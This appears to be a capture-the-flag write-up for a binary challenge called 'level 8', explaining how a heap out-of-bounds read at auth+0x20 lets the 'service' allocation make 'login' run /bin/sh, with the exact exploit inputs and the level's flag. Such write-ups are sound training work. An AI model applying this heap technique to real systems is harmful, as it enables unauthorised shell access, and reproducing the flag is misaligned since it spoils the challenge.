# level 8

1. Code / Binary Analysis

The program accepts four commands:

auth <string> → allocates 4 bytes with malloc() and copies the argument.
reset → frees auth.
service <string> → allocates memory with strdup().
login → checks memory at auth + 0x20.

The critical code is:
```C
auth = malloc(4);
```

for open a subshell which give rights for next level
```C
if (*(int *)(auth + 0x20) == 0)
    printf("Password:\n");
else
    system("/bin/sh");
```
The program also prints the addresses of auth and service, which helps observe the heap layout.

2. Vulnerability

The vulnerability is an out-of-bounds read.

auth only gets 4 bytes, but login reads an integer 32 bytes after auth:

*(int *)(auth + 0x20)

The service command uses strdup(), allowing us to create a controlled heap allocation near auth.

If auth is NULL, login instead causes a segmentation fault because it accesses 0x20.



3. Exploitation

auth a

service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

login


## Flag
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a